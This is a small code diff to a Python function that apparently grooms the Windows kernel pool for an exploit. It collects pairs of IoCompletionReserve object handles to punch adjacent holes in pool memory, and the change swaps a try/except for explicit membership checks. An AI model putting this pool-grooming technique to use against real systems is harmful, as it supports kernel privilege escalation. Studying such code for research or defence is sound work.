@@ -356,12 +356,9 @@ def we_can_make_pool_holes():
             # after the 0x20 chunk hole, the first object will be the IoCompletionReserve object
             offset = IoCompletionReserve_size   
             for i in range(offset, offset + (7 * combined_size), combined_size):
-                try:
-                    # chunks need to be next to each other for the coalesce to take effect
+                if (obj + i) in khandlesd and (obj + i - IoCompletionReserve_size) in khandlesd:
                     bin.append(khandlesd[obj + i])
                     bin.append(khandlesd[obj + i - IoCompletionReserve_size])
-                except KeyError:
-                    pass
 
             # make sure it's contiguously allocated memory
             if len(tuple(bin)) == 14:
